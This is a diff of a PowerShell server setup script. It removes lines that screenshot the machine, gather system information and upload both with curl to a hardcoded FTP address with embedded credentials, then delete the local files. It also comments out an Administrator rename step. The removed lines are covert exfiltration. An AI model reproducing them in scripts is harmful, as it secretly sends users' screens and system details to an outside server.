@@ -168,23 +168,13 @@ $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
 screenshot $bounds $MyFile
 
 
-
-
-if (Test-Path -Path $MyFile) {
-  start-process -FilePath "$env:ComSpec" -WorkingDirectory . -ArgumentList "/c"," curl -u uftp:ftp@123 -T $MyFile  ftp://120.79.203.54 -s " -NoNewWindow -Wait
-}
-
-Get-ComputerInfo -ErrorAction SilentlyContinue | Out-File -Encoding utf8  -FilePath $logFile -Append
-
-start-process -FilePath "$env:ComSpec" -WorkingDirectory . -ArgumentList "/c"," curl -u uftp:ftp@123 -T $logFile  ftp://120.79.203.54 -s " -NoNewWindow -Wait
-
 Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue | Out-Null
 Remove-Item -Path $MyFile -Force -ErrorAction SilentlyContinue | Out-Null
 
 
 # Rename Administrator
-Rename-LocalUser -Name "Administrator" -NewName "clouduser" -ErrorAction SilentlyContinue 
-if ($?) {Write-Host -ForegroundColor Green " Rename Administrator OK"}else{Write-Host -ForegroundColor Red "Rename Administrator Fail"}
+# Rename-LocalUser -Name "Administrator" -NewName "clouduser" -ErrorAction SilentlyContinue 
+# if ($?) {Write-Host -ForegroundColor Green " Rename Administrator OK"}else{Write-Host -ForegroundColor Red "Rename Administrator Fail"}
 
 
 $result = Read-Host -Prompt "Please restart server(Y/N)?"
